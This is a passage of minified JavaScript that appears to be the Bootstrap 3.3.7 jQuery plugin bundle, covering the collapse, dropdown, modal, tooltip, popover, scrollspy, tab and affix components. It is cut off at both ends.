i,r=t(this),o=t(r.attr("data-target")||(i=r.attr("href"))&&i.replace(/.*(?=#[^\s]+$)/,""));if(o.hasClass("carousel")){var s=t.extend({},o.data(),r.data()),a=r.attr("data-slide-to");a&&(s.interval=!1),e.call(o,s),a&&o.data("bs.carousel").to(a),n.preventDefault()}};t(document).on("click.bs.carousel.data-api","[data-slide]",r).on("click.bs.carousel.data-api","[data-slide-to]",r),t(window).on("load",(function(){t('[data-ride="carousel"]').each((function(){var n=t(this);e.call(n,n.data())}))}))}(jQuery),function(t){"use strict";function e(e){var n,i=e.attr("data-target")||(n=e.attr("href"))&&n.replace(/.*(?=#[^\s]+$)/,"");return t(i)}function n(e){return this.each((function(){var n=t(this),r=n.data("bs.collapse"),o=t.extend({},i.DEFAULTS,n.data(),"object"==typeof e&&e);!r&&o.toggle&&/show|hide/.test(e)&&(o.toggle=!1),r||n.data("bs.collapse",r=new i(this,o)),"string"==typeof e&&r[e]()}))}var i=function(e,n){this.$element=t(e),this.options=t.extend({},i.DEFAULTS,n),this.$trigger=t('[data-toggle="collapse"][href="#'+e.id+'"],[data-toggle="collapse"][data-target="#'+e.id+'"]'),this.transitioning=null,this.options.parent?this.$parent=this.getParent():this.addAriaAndCollapsedClass(this.$element,this.$trigger),this.options.toggle&&this.toggle()};i.VERSION="3.3.7",i.TRANSITION_DURATION=350,i.DEFAULTS={toggle:!0},i.prototype.dimension=function(){return this.$element.hasClass("width")?"width":"height"},i.prototype.show=function(){if(!this.transitioning&&!this.$element.hasClass("in")){var e,r=this.$parent&&this.$parent.children(".panel").children(".in, .collapsing");if(!(r&&r.length&&(e=r.data("bs.collapse"),e&&e.transitioning))){var o=t.Event("show.bs.collapse");if(this.$element.trigger(o),!o.isDefaultPrevented()){r&&r.length&&(n.call(r,"hide"),e||r.data("bs.collapse",null));var s=this.dimension();this.$element.removeClass("collapse").addClass("collapsing")[s](0).attr("aria-expanded",!0),this.$trigger.removeClass("collapsed").attr("aria-expanded",!0),this.transitioning=1;var a=function(){this.$element.removeClass("collapsing").addClass("collapse in")[s](""),this.transitioning=0,this.$element.trigger("shown.bs.collapse")};if(!t.support.transition)return a.call(this);var l=t.camelCase(["scroll",s].join("-"));this.$element.one("bsTransitionEnd",t.proxy(a,this)).emulateTransitionEnd(i.TRANSITION_DURATION)[s](this.$element[0][l])}}}},i.prototype.hide=function(){if(!this.transitioning&&this.$element.hasClass("in")){var e=t.Event("hide.bs.collapse");if(this.$element.trigger(e),!e.isDefaultPrevented()){var n=this.dimension();this.$element[n](this.$element[n]())[0].offsetHeight,this.$element.addClass("collapsing").removeClass("collapse in").attr("aria-expanded",!1),this.$trigger.addClass("collapsed").attr("aria-expanded",!1),this.transitioning=1;var r=function(){this.transitioning=0,this.$element.removeClass("collapsing").addClass("collapse").trigger("hidden.bs.collapse")};return t.support.transition?void this.$element[n](0).one("bsTransitionEnd",t.proxy(r,this)).emulateTransitionEnd(i.TRANSITION_DURATION):r.call(this)}}},i.prototype.toggle=function(){this[this.$element.hasClass("in")?"hide":"show"]()},i.prototype.getParent=function(){return t(this.options.parent).find('[data-toggle="collapse"][data-parent="'+this.options.parent+'"]').each(t.proxy((function(n,i){var r=t(i);this.addAriaAndCollapsedClass(e(r),r)}),this)).end()},i.prototype.addAriaAndCollapsedClass=function(t,e){var n=t.hasClass("in");t.attr("aria-expanded",n),e.toggleClass("collapsed",!n).attr("aria-expanded",n)};var r=t.fn.collapse;t.fn.collapse=n,t.fn.collapse.Constructor=i,t.fn.collapse.noConflict=function(){return t.fn.collapse=r,this},t(document).on("click.bs.collapse.data-api",'[data-toggle="collapse"]',(function(i){var r=t(this);r.attr("data-target")||i.preventDefault();var o=e(r),s=o.data("bs.collapse")?"toggle":r.data();n.call(o,s)}))}(jQuery),function(t){"use strict";function e(e){var n=e.attr("data-target");n||(n=(n=e.attr("href"))&&/#[A-Za-z]/.test(n)&&n.replace(/.*(?=#[^\s]*$)/,""));var i=n&&t(n);return i&&i.length?i:e.parent()}function n(n){n&&3===n.which||(t(i).remove(),t(r).each((function(){var i=t(this),r=e(i),o={relatedTarget:this};r.hasClass("open")&&(n&&"click"==n.type&&/input|textarea/i.test(n.target.tagName)&&t.contains(r[0],n.target)||(r.trigger(n=t.Event("hide.bs.dropdown",o)),n.isDefaultPrevented()||(i.attr("aria-expanded","false"),r.removeClass("open").trigger(t.Event("hidden.bs.dropdown",o)))))})))}var i=".dropdown-backdrop",r='[data-toggle="dropdown"]',o=function(e){t(e).on("click.bs.dropdown",this.toggle)};o.VERSION="3.3.7",o.prototype.toggle=function(i){var r=t(this);if(!r.is(".disabled, :disabled")){var o=e(r),s=o.hasClass("open");if(n(),!s){"ontouchstart"in document.documentElement&&!o.closest(".navbar-nav").length&&t(document.createElement("div")).addClass("dropdown-backdrop").insertAfter(t(this)).on("click",n);var a={relatedTarget:this};if(o.trigger(i=t.Event("show.bs.dropdown",a)),i.isDefaultPrevented())return;r.trigger("focus").attr("aria-expanded","true"),o.toggleClass("open").trigger(t.Event("shown.bs.dropdown",a))}return!1}},o.prototype.keydown=function(n){if(/(38|40|27|32)/.test(n.which)&&!/input|textarea/i.test(n.target.tagName)){var i=t(this);if(n.preventDefault(),n.stopPropagation(),!i.is(".disabled, :disabled")){var o=e(i),s=o.hasClass("open");if(!s&&27!=n.which||s&&27==n.which)return 27==n.which&&o.find(r).trigger("focus"),i.trigger("click");var a=o.find(".dropdown-menu li:not(.disabled):visible a");if(a.length){var l=a.index(n.target);38==n.which&&l>0&&l--,40==n.which&&l<a.length-1&&l++,~l||(l=0),a.eq(l).trigger("focus")}}}};var s=t.fn.dropdown;t.fn.dropdown=function(e){return this.each((function(){var n=t(this),i=n.data("bs.dropdown");i||n.data("bs.dropdown",i=new o(this)),"string"==typeof e&&i[e].call(n)}))},t.fn.dropdown.Constructor=o,t.fn.dropdown.noConflict=function(){return t.fn.dropdown=s,this},t(document).on("click.bs.dropdown.data-api",n).on("click.bs.dropdown.data-api",".dropdown form",(function(t){t.stopPropagation()})).on("click.bs.dropdown.data-api",r,o.prototype.toggle).on("keydown.bs.dropdown.data-api",r,o.prototype.keydown).on("keydown.bs.dropdown.data-api",".dropdown-menu",o.prototype.keydown)}(jQuery),function(t){"use strict";function e(e,i){return this.each((function(){var r=t(this),o=r.data("bs.modal"),s=t.extend({},n.DEFAULTS,r.data(),"object"==typeof e&&e);o||r.data("bs.modal",o=new n(this,s)),"string"==typeof e?o[e](i):s.show&&o.show(i)}))}var n=function(e,n){this.options=n,this.$body=t(document.body),this.$element=t(e),this.$dialog=this.$element.find(".modal-dialog"),this.$backdrop=null,this.isShown=null,this.originalBodyPad=null,this.scrollbarWidth=0,this.ignoreBackdropClick=!1,this.options.remote&&this.$element.find(".modal-content").load(this.options.remote,t.proxy((function(){this.$element.trigger("loaded.bs.modal")}),this))};n.VERSION="3.3.7",n.TRANSITION_DURATION=300,n.BACKDROP_TRANSITION_DURATION=150,n.DEFAULTS={backdrop:!0,keyboard:!0,show:!0},n.prototype.toggle=function(t){return this.isShown?this.hide():this.show(t)},n.prototype.show=function(e){var i=this,r=t.Event("show.bs.modal",{relatedTarget:e});this.$element.trigger(r),this.isShown||r.isDefaultPrevented()||(this.isShown=!0,this.checkScrollbar(),this.setScrollbar(),this.$body.addClass("modal-open"),this.escape(),this.resize(),this.$element.on("click.dismiss.bs.modal",'[data-dismiss="modal"]',t.proxy(this.hide,this)),this.$dialog.on("mousedown.dismiss.bs.modal",(function(){i.$element.one("mouseup.dismiss.bs.modal",(function(e){t(e.target).is(i.$element)&&(i.ignoreBackdropClick=!0)}))})),this.backdrop((function(){var r=t.support.transition&&i.$element.hasClass("fade");i.$element.parent().length||i.$element.appendTo(i.$body),i.$element.show().scrollTop(0),i.adjustDialog(),r&&i.$element[0].offsetWidth,i.$element.addClass("in"),i.enforceFocus();var o=t.Event("shown.bs.modal",{relatedTarget:e});r?i.$dialog.one("bsTransitionEnd",(function(){i.$element.trigger("focus").trigger(o)})).emulateTransitionEnd(n.TRANSITION_DURATION):i.$element.trigger("focus").trigger(o)})))},n.prototype.hide=function(e){e&&e.preventDefault(),e=t.Event("hide.bs.modal"),this.$element.trigger(e),this.isShown&&!e.isDefaultPrevented()&&(this.isShown=!1,this.escape(),this.resize(),t(document).off("focusin.bs.modal"),this.$element.removeClass("in").off("click.dismiss.bs.modal").off("mouseup.dismiss.bs.modal"),this.$dialog.off("mousedown.dismiss.bs.modal"),t.support.transition&&this.$element.hasClass("fade")?this.$element.one("bsTransitionEnd",t.proxy(this.hideModal,this)).emulateTransitionEnd(n.TRANSITION_DURATION):this.hideModal())},n.prototype.enforceFocus=function(){t(document).off("focusin.bs.modal").on("focusin.bs.modal",t.proxy((function(t){document===t.target||this.$element[0]===t.target||this.$element.has(t.target).length||this.$element.trigger("focus")}),this))},n.prototype.escape=function(){this.isShown&&this.options.keyboard?this.$element.on("keydown.dismiss.bs.modal",t.proxy((function(t){27==t.which&&this.hide()}),this)):this.isShown||this.$element.off("keydown.dismiss.bs.modal")},n.prototype.resize=function(){this.isShown?t(window).on("resize.bs.modal",t.proxy(this.handleUpdate,this)):t(window).off("resize.bs.modal")},n.prototype.hideModal=function(){var t=this;this.$element.hide(),this.backdrop((function(){t.$body.removeClass("modal-open"),t.resetAdjustments(),t.resetScrollbar(),t.$element.trigger("hidden.bs.modal")}))},n.prototype.removeBackdrop=function(){this.$backdrop&&this.$backdrop.remove(),this.$backdrop=null},n.prototype.backdrop=function(e){var i=this,r=this.$element.hasClass("fade")?"fade":"";if(this.isShown&&this.options.backdrop){var o=t.support.transition&&r;if(this.$backdrop=t(document.createElement("div")).addClass("modal-backdrop "+r).appendTo(this.$body),this.$element.on("click.dismiss.bs.modal",t.proxy((function(t){return this.ignoreBackdropClick?void(this.ignoreBackdropClick=!1):void(t.target===t.currentTarget&&("static"==this.options.backdrop?this.$element[0].focus():this.hide()))}),this)),o&&this.$backdrop[0].offsetWidth,this.$backdrop.addClass("in"),!e)return;o?this.$backdrop.one("bsTransitionEnd",e).emulateTransitionEnd(n.BACKDROP_TRANSITION_DURATION):e()}else if(!this.isShown&&this.$backdrop){this.$backdrop.removeClass("in");var s=function(){i.removeBackdrop(),e&&e()};t.support.transition&&this.$element.hasClass("fade")?this.$backdrop.one("bsTransitionEnd",s).emulateTransitionEnd(n.BACKDROP_TRANSITION_DURATION):s()}else e&&e()},n.prototype.handleUpdate=function(){this.adjustDialog()},n.prototype.adjustDialog=function(){var t=this.$element[0].scrollHeight>document.documentElement.clientHeight;this.$element.css({paddingLeft:!this.bodyIsOverflowing&&t?this.scrollbarWidth:"",paddingRight:this.bodyIsOverflowing&&!t?this.scrollbarWidth:""})},n.prototype.resetAdjustments=function(){this.$element.css({paddingLeft:"",paddingRight:""})},n.prototype.checkScrollbar=function(){var t=window.innerWidth;if(!t){var e=document.documentElement.getBoundingClientRect();t=e.right-Math.abs(e.left)}this.bodyIsOverflowing=document.body.clientWidth<t,this.scrollbarWidth=this.measureScrollbar()},n.prototype.setScrollbar=function(){var t=parseInt(this.$body.css("padding-right")||0,10);this.originalBodyPad=document.body.style.paddingRight||"",this.bodyIsOverflowing&&this.$body.css("padding-right",t+this.scrollbarWidth)},n.prototype.resetScrollbar=function(){this.$body.css("padding-right",this.originalBodyPad)},n.prototype.measureScrollbar=function(){var t=document.createElement("div");t.className="modal-scrollbar-measure",this.$body.append(t);var e=t.offsetWidth-t.clientWidth;return this.$body[0].removeChild(t),e};var i=t.fn.modal;t.fn.modal=e,t.fn.modal.Constructor=n,t.fn.modal.noConflict=function(){return t.fn.modal=i,this},t(document).on("click.bs.modal.data-api",'[data-toggle="modal"]',(function(n){var i=t(this),r=i.attr("href"),o=t(i.attr("data-target")||r&&r.replace(/.*(?=#[^\s]+$)/,"")),s=o.data("bs.modal")?"toggle":t.extend({remote:!/#/.test(r)&&r},o.data(),i.data());i.is("a")&&n.preventDefault(),o.one("show.bs.modal",(function(t){t.isDefaultPrevented()||o.one("hidden.bs.modal",(function(){i.is(":visible")&&i.trigger("focus")}))})),e.call(o,s,this)}))}(jQuery),function(t){"use strict";var e=function(t,e){this.type=null,this.options=null,this.enabled=null,this.timeout=null,this.hoverState=null,this.$element=null,this.inState=null,this.init("tooltip",t,e)};e.VERSION="3.3.7",e.TRANSITION_DURATION=150,e.DEFAULTS={animation:!0,placement:"top",selector:!1,template:'<div class="tooltip" role="tooltip"><div class="tooltip-arrow"></div><div class="tooltip-inner"></div></div>',trigger:"hover focus",title:"",delay:0,html:!1,container:!1,viewport:{selector:"body",padding:0}},e.prototype.init=function(e,n,i){if(this.enabled=!0,this.type=e,this.$element=t(n),this.options=this.getOptions(i),this.$viewport=this.options.viewport&&t(t.isFunction(this.options.viewport)?this.options.viewport.call(this,this.$element):this.options.viewport.selector||this.options.viewport),this.inState={click:!1,hover:!1,focus:!1},this.$element[0]instanceof document.constructor&&!this.options.selector)throw new Error("`selector` option must be specified when initializing "+this.type+" on the window.document object!");for(var r=this.options.trigger.split(" "),o=r.length;o--;){var s=r[o];if("click"==s)this.$element.on("click."+this.type,this.options.selector,t.proxy(this.toggle,this));else if("manual"!=s){var a="hover"==s?"mouseenter":"focusin",l="hover"==s?"mouseleave":"focusout";this.$element.on(a+"."+this.type,this.options.selector,t.proxy(this.enter,this)),this.$element.on(l+"."+this.type,this.options.selector,t.proxy(this.leave,this))}}this.options.selector?this._options=t.extend({},this.options,{trigger:"manual",selector:""}):this.fixTitle()},e.prototype.getDefaults=function(){return e.DEFAULTS},e.prototype.getOptions=function(e){return(e=t.extend({},this.getDefaults(),this.$element.data(),e)).delay&&"number"==typeof e.delay&&(e.delay={show:e.delay,hide:e.delay}),e},e.prototype.getDelegateOptions=function(){var e={},n=this.getDefaults();return this._options&&t.each(this._options,(function(t,i){n[t]!=i&&(e[t]=i)})),e},e.prototype.enter=function(e){var n=e instanceof this.constructor?e:t(e.currentTarget).data("bs."+this.type);return n||(n=new this.constructor(e.currentTarget,this.getDelegateOptions()),t(e.currentTarget).data("bs."+this.type,n)),e instanceof t.Event&&(n.inState["focusin"==e.type?"focus":"hover"]=!0),n.tip().hasClass("in")||"in"==n.hoverState?void(n.hoverState="in"):(clearTimeout(n.timeout),n.hoverState="in",n.options.delay&&n.options.delay.show?void(n.timeout=setTimeout((function(){"in"==n.hoverState&&n.show()}),n.options.delay.show)):n.show())},e.prototype.isInStateTrue=function(){for(var t in this.inState)if(this.inState[t])return!0;return!1},e.prototype.leave=function(e){var n=e instanceof this.constructor?e:t(e.currentTarget).data("bs."+this.type);if(n||(n=new this.constructor(e.currentTarget,this.getDelegateOptions()),t(e.currentTarget).data("bs."+this.type,n)),e instanceof t.Event&&(n.inState["focusout"==e.type?"focus":"hover"]=!1),!n.isInStateTrue())return clearTimeout(n.timeout),n.hoverState="out",n.options.delay&&n.options.delay.hide?void(n.timeout=setTimeout((function(){"out"==n.hoverState&&n.hide()}),n.options.delay.hide)):n.hide()},e.prototype.show=function(){var n=t.Event("show.bs."+this.type);if(this.hasContent()&&this.enabled){this.$element.trigger(n);var i=t.contains(this.$element[0].ownerDocument.documentElement,this.$element[0]);if(n.isDefaultPrevented()||!i)return;var r=this,o=this.tip(),s=this.getUID(this.type);this.setContent(),o.attr("id",s),this.$element.attr("aria-describedby",s),this.options.animation&&o.addClass("fade");var a="function"==typeof this.options.placement?this.options.placement.call(this,o[0],this.$element[0]):this.options.placement,l=/\s?auto?\s?/i,c=l.test(a);c&&(a=a.replace(l,"")||"top"),o.detach().css({top:0,left:0,display:"block"}).addClass(a).data("bs."+this.type,this),this.options.container?o.appendTo(this.options.container):o.insertAfter(this.$element),this.$element.trigger("inserted.bs."+this.type);var u=this.getPosition(),d=o[0].offsetWidth,h=o[0].offsetHeight;if(c){var f=a,p=this.getPosition(this.$viewport);a="bottom"==a&&u.bottom+h>p.bottom?"top":"top"==a&&u.top-h<p.top?"bottom":"right"==a&&u.right+d>p.width?"left":"left"==a&&u.left-d<p.left?"right":a,o.removeClass(f).addClass(a)}var g=this.getCalculatedOffset(a,u,d,h);this.applyPlacement(g,a);var m=function(){var t=r.hoverState;r.$element.trigger("shown.bs."+r.type),r.hoverState=null,"out"==t&&r.leave(r)};t.support.transition&&this.$tip.hasClass("fade")?o.one("bsTransitionEnd",m).emulateTransitionEnd(e.TRANSITION_DURATION):m()}},e.prototype.applyPlacement=function(e,n){var i=this.tip(),r=i[0].offsetWidth,o=i[0].offsetHeight,s=parseInt(i.css("margin-top"),10),a=parseInt(i.css("margin-left"),10);isNaN(s)&&(s=0),isNaN(a)&&(a=0),e.top+=s,e.left+=a,t.offset.setOffset(i[0],t.extend({using:function(t){i.css({top:Math.round(t.top),left:Math.round(t.left)})}},e),0),i.addClass("in");var l=i[0].offsetWidth,c=i[0].offsetHeight;"top"==n&&c!=o&&(e.top=e.top+o-c);var u=this.getViewportAdjustedDelta(n,e,l,c);u.left?e.left+=u.left:e.top+=u.top;var d=/top|bottom/.test(n),h=d?2*u.left-r+l:2*u.top-o+c,f=d?"offsetWidth":"offsetHeight";i.offset(e),this.replaceArrow(h,i[0][f],d)},e.prototype.replaceArrow=function(t,e,n){this.arrow().css(n?"left":"top",50*(1-t/e)+"%").css(n?"top":"left","")},e.prototype.setContent=function(){var t=this.tip(),e=this.getTitle();t.find(".tooltip-inner")[this.options.html?"html":"text"](e),t.removeClass("fade in top bottom left right")},e.prototype.hide=function(n){function i(){"in"!=r.hoverState&&o.detach(),r.$element&&r.$element.removeAttr("aria-describedby").trigger("hidden.bs."+r.type),n&&n()}var r=this,o=t(this.$tip),s=t.Event("hide.bs."+this.type);if(this.$element.trigger(s),!s.isDefaultPrevented())return o.removeClass("in"),t.support.transition&&o.hasClass("fade")?o.one("bsTransitionEnd",i).emulateTransitionEnd(e.TRANSITION_DURATION):i(),this.hoverState=null,this},e.prototype.fixTitle=function(){var t=this.$element;(t.attr("title")||"string"!=typeof t.attr("data-original-title"))&&t.attr("data-original-title",t.attr("title")||"").attr("title","")},e.prototype.hasContent=function(){return this.getTitle()},e.prototype.getPosition=function(e){var n=(e=e||this.$element)[0],i="BODY"==n.tagName,r=n.getBoundingClientRect();null==r.width&&(r=t.extend({},r,{width:r.right-r.left,height:r.bottom-r.top}));var o=window.SVGElement&&n instanceof window.SVGElement,s=i?{top:0,left:0}:o?null:e.offset(),a={scroll:i?document.documentElement.scrollTop||document.body.scrollTop:e.scrollTop()},l=i?{width:t(window).width(),height:t(window).height()}:null;return t.extend({},r,a,l,s)},e.prototype.getCalculatedOffset=function(t,e,n,i){return"bottom"==t?{top:e.top+e.height,left:e.left+e.width/2-n/2}:"top"==t?{top:e.top-i,left:e.left+e.width/2-n/2}:"left"==t?{top:e.top+e.height/2-i/2,left:e.left-n}:{top:e.top+e.height/2-i/2,left:e.left+e.width}},e.prototype.getViewportAdjustedDelta=function(t,e,n,i){var r={top:0,left:0};if(!this.$viewport)return r;var o=this.options.viewport&&this.options.viewport.padding||0,s=this.getPosition(this.$viewport);if(/right|left/.test(t)){var a=e.top-o-s.scroll,l=e.top+o-s.scroll+i;a<s.top?r.top=s.top-a:l>s.top+s.height&&(r.top=s.top+s.height-l)}else{var c=e.left-o,u=e.left+o+n;c<s.left?r.left=s.left-c:u>s.right&&(r.left=s.left+s.width-u)}return r},e.prototype.getTitle=function(){var t=this.$element,e=this.options;return t.attr("data-original-title")||("function"==typeof e.title?e.title.call(t[0]):e.title)},e.prototype.getUID=function(t){do{t+=~~(1e6*Math.random())}while(document.getElementById(t));return t},e.prototype.tip=function(){if(!this.$tip&&(this.$tip=t(this.options.template),1!=this.$tip.length))throw new Error(this.type+" `template` option must consist of exactly 1 top-level element!");return this.$tip},e.prototype.arrow=function(){return this.$arrow=this.$arrow||this.tip().find(".tooltip-arrow")},e.prototype.enable=function(){this.enabled=!0},e.prototype.disable=function(){this.enabled=!1},e.prototype.toggleEnabled=function(){this.enabled=!this.enabled},e.prototype.toggle=function(e){var n=this;e&&((n=t(e.currentTarget).data("bs."+this.type))||(n=new this.constructor(e.currentTarget,this.getDelegateOptions()),t(e.currentTarget).data("bs."+this.type,n))),e?(n.inState.click=!n.inState.click,n.isInStateTrue()?n.enter(n):n.leave(n)):n.tip().hasClass("in")?n.leave(n):n.enter(n)},e.prototype.destroy=function(){var t=this;clearTimeout(this.timeout),this.hide((function(){t.$element.off("."+t.type).removeData("bs."+t.type),t.$tip&&t.$tip.detach(),t.$tip=null,t.$arrow=null,t.$viewport=null,t.$element=null}))};var n=t.fn.tooltip;t.fn.tooltip=function(n){return this.each((function(){var i=t(this),r=i.data("bs.tooltip"),o="object"==typeof n&&n;!r&&/destroy|hide/.test(n)||(r||i.data("bs.tooltip",r=new e(this,o)),"string"==typeof n&&r[n]())}))},t.fn.tooltip.Constructor=e,t.fn.tooltip.noConflict=function(){return t.fn.tooltip=n,this}}(jQuery),function(t){"use strict";var e=function(t,e){this.init("popover",t,e)};if(!t.fn.tooltip)throw new Error("Popover requires tooltip.js");e.VERSION="3.3.7",e.DEFAULTS=t.extend({},t.fn.tooltip.Constructor.DEFAULTS,{placement:"right",trigger:"click",content:"",template:'<div class="popover" role="tooltip"><div class="arrow"></div><h3 class="popover-title"></h3><div class="popover-content"></div></div>'}),e.prototype=t.extend({},t.fn.tooltip.Constructor.prototype),e.prototype.constructor=e,e.prototype.getDefaults=function(){return e.DEFAULTS},e.prototype.setContent=function(){var t=this.tip(),e=this.getTitle(),n=this.getContent();t.find(".popover-title")[this.options.html?"html":"text"](e),t.find(".popover-content").children().detach().end()[this.options.html?"string"==typeof n?"html":"append":"text"](n),t.removeClass("fade top bottom left right in"),t.find(".popover-title").html()||t.find(".popover-title").hide()},e.prototype.hasContent=function(){return this.getTitle()||this.getContent()},e.prototype.getContent=function(){var t=this.$element,e=this.options;return t.attr("data-content")||("function"==typeof e.content?e.content.call(t[0]):e.content)},e.prototype.arrow=function(){return this.$arrow=this.$arrow||this.tip().find(".arrow")};var n=t.fn.popover;t.fn.popover=function(n){return this.each((function(){var i=t(this),r=i.data("bs.popover"),o="object"==typeof n&&n;!r&&/destroy|hide/.test(n)||(r||i.data("bs.popover",r=new e(this,o)),"string"==typeof n&&r[n]())}))},t.fn.popover.Constructor=e,t.fn.popover.noConflict=function(){return t.fn.popover=n,this}}(jQuery),function(t){"use strict";function e(n,i){this.$body=t(document.body),this.$scrollElement=t(t(n).is(document.body)?window:n),this.options=t.extend({},e.DEFAULTS,i),this.selector=(this.options.target||"")+" .nav li > a",this.offsets=[],this.targets=[],this.activeTarget=null,this.scrollHeight=0,this.$scrollElement.on("scroll.bs.scrollspy",t.proxy(this.process,this)),this.refresh(),this.process()}function n(n){return this.each((function(){var i=t(this),r=i.data("bs.scrollspy"),o="object"==typeof n&&n;r||i.data("bs.scrollspy",r=new e(this,o)),"string"==typeof n&&r[n]()}))}e.VERSION="3.3.7",e.DEFAULTS={offset:10},e.prototype.getScrollHeight=function(){return this.$scrollElement[0].scrollHeight||Math.max(this.$body[0].scrollHeight,document.documentElement.scrollHeight)},e.prototype.refresh=function(){var e=this,n="offset",i=0;this.offsets=[],this.targets=[],this.scrollHeight=this.getScrollHeight(),t.isWindow(this.$scrollElement[0])||(n="position",i=this.$scrollElement.scrollTop()),this.$body.find(this.selector).map((function(){var e=t(this),r=e.data("target")||e.attr("href"),o=/^#./.test(r)&&t(r);return o&&o.length&&o.is(":visible")&&[[o[n]().top+i,r]]||null})).sort((function(t,e){return t[0]-e[0]})).each((function(){e.offsets.push(this[0]),e.targets.push(this[1])}))},e.prototype.process=function(){var t,e=this.$scrollElement.scrollTop()+this.options.offset,n=this.getScrollHeight(),i=this.options.offset+n-this.$scrollElement.height(),r=this.offsets,o=this.targets,s=this.activeTarget;if(this.scrollHeight!=n&&this.refresh(),e>=i)return s!=(t=o[o.length-1])&&this.activate(t);if(s&&e<r[0])return this.activeTarget=null,this.clear();for(t=r.length;t--;)s!=o[t]&&e>=r[t]&&(void 0===r[t+1]||e<r[t+1])&&this.activate(o[t])},e.prototype.activate=function(e){this.activeTarget=e,this.clear();var n=this.selector+'[data-target="'+e+'"],'+this.selector+'[href="'+e+'"]',i=t(n).parents("li").addClass("active");i.parent(".dropdown-menu").length&&(i=i.closest("li.dropdown").addClass("active")),i.trigger("activate.bs.scrollspy")},e.prototype.clear=function(){t(this.selector).parentsUntil(this.options.target,".active").removeClass("active")};var i=t.fn.scrollspy;t.fn.scrollspy=n,t.fn.scrollspy.Constructor=e,t.fn.scrollspy.noConflict=function(){return t.fn.scrollspy=i,this},t(window).on("load.bs.scrollspy.data-api",(function(){t('[data-spy="scroll"]').each((function(){var e=t(this);n.call(e,e.data())}))}))}(jQuery),function(t){"use strict";function e(e){return this.each((function(){var i=t(this),r=i.data("bs.tab");r||i.data("bs.tab",r=new n(this)),"string"==typeof e&&r[e]()}))}var n=function(e){this.element=t(e)};n.VERSION="3.3.7",n.TRANSITION_DURATION=150,n.prototype.show=function(){var e=this.element,n=e.closest("ul:not(.dropdown-menu)"),i=e.data("target");if(i||(i=(i=e.attr("href"))&&i.replace(/.*(?=#[^\s]*$)/,"")),!e.parent("li").hasClass("active")){var r=n.find(".active:last a"),o=t.Event("hide.bs.tab",{relatedTarget:e[0]}),s=t.Event("show.bs.tab",{relatedTarget:r[0]});if(r.trigger(o),e.trigger(s),!s.isDefaultPrevented()&&!o.isDefaultPrevented()){var a=t(i);this.activate(e.closest("li"),n),this.activate(a,a.parent(),(function(){r.trigger({type:"hidden.bs.tab",relatedTarget:e[0]}),e.trigger({type:"shown.bs.tab",relatedTarget:r[0]})}))}}},n.prototype.activate=function(e,i,r){function o(){s.removeClass("active").find("> .dropdown-menu > .active").removeClass("active").end().find('[data-toggle="tab"]').attr("aria-expanded",!1),e.addClass("active").find('[data-toggle="tab"]').attr("aria-expanded",!0),a?(e[0].offsetWidth,e.addClass("in")):e.removeClass("fade"),e.parent(".dropdown-menu").length&&e.closest("li.dropdown").addClass("active").end().find('[data-toggle="tab"]').attr("aria-expanded",!0),r&&r()}var s=i.find("> .active"),a=r&&t.support.transition&&(s.length&&s.hasClass("fade")||!!i.find("> .fade").length);s.length&&a?s.one("bsTransitionEnd",o).emulateTransitionEnd(n.TRANSITION_DURATION):o(),s.removeClass("in")};var i=t.fn.tab;t.fn.tab=e,t.fn.tab.Constructor=n,t.fn.tab.noConflict=function(){return t.fn.tab=i,this};var r=function(n){n.preventDefault(),e.call(t(this),"show")};t(document).on("click.bs.tab.data-api",'[data-toggle="tab"]',r).on("click.bs.tab.data-api",'[data-toggle="pill"]',r)}(jQuery),function(t){"use strict";function e(e){return this.each((function(){var i=t(this),r=i.data("bs.affix"),o="object"==typeof e&&e;r||i.data("bs.affix",r=new n(this,o)),"string"==typeof e&&r[e]()}))}var n=function(e,i){this.options=t.extend({},n.DEFAULTS,i),this.$target=t(this.options.target).on("scroll.bs.affix.data-api",t.proxy(this.checkPosition,this)).on("click.bs.affix.data-api",t.proxy(this.checkPositionWithEventLoop,this)),this.$element=t(e),this.affixed=null,this.unpin=null,this.pinnedOffset=null,this.checkPosition()};n.VERSION="3.3.7",n.RESET="affix affix-top affix-bottom",n.DEFAULTS={offset:0,target:window},n.prototype.getState=function(t,e,n,i){var r=this.$target.scrollTop(),o=this.$element.offset(),s=this.$target.height();if(null!=n&&"top"==this.affixed)return r<n&&"top";if("bottom"==this.affixed)return null!=n?!(r+this.unpin<=o.top)&&"bottom":!(r+s<=t-i)&&"bottom";var a=null==this.affixed,l=a?r:o.top;return null!=n&&r<=n?"top":null!=i&&l+(a?s:e)>=t-i&&"bottom"},n.prototype.getPinnedOffset=function(){if(this.pinnedOffset)return this.pinnedOffset;this.$element.removeClass(n.RESET).addClass("affix");var t=this.$target.scrollTop(),e=this.$element.offset();return this.pinnedOffset=e.top-t},n.prototype.checkPositionWithEventLoop=function(){setTimeout(t.proxy(this.checkPosition,this),1)},n.prototype.checkPosition=function(){if(this.$element.is(":visible")){var e=this.$element.height(),i=this.options.offset,r=i.top,o=i.bottom,s=Math.max(t(document).height(),t(document.body).height());"object"!=typeof i&&(o=r=i),"function"==typeof r&&(r=i.top(this.$element)),"function"==typeof o&&(o=i.bottom(this.$element));var a=this.getState(s,e,r,o);if(this.affixed!=a){null!=this.unpin&&this.$element.css("top","");var l="affix"+(a?"-"+a:""),c=t.Event(l+".bs.affix");if(this.$element.trigger(c),c.isDefaultPrevented())return;this.affixed=a,this.unpin="bottom"==a?this.getPinnedOffset():null,this.$element.removeClass(n.RESET).addClass(l).trigger(l.replace("affix","affixed")+".bs.affix")}"bottom"==a&&this.$element.offset({top:s-e-o})}};var i=t.fn.affix;t.fn.affix=e,t.fn.affix.Constructor=n,t.fn.affix.noConflict=function(){return t.fn.affix=i,this},t(window).on("load",(function(){t('[data-spy="affix"]').each((function(){var n=t(this),i=n.data();i.offset=i.offset||{},null!=i.offsetBottom&&(i.offset.bottom=i.offsetBottom),null!=i.offsetTop&&(i.offset.top=i.offsetTop),e.call(n,i)}))}))}(jQuery),function(t){t.event.special.wheel={setup:function(){this.addEventListener&&this.addEventListener("DOMMouseScroll",t.event.special.wheel.handler,!1),this.onwheel=t.event.special.wheel.handler},teardown:function(){this.removeEventListener&&this.removeEventListener("DOMMouseScroll",t.event.special.wheel.handler,!1),this.onwheel=null},handler:function(e){(e=t.event.fix(e||window.event)).type="wheel",e.delta=0,"object"==typeof 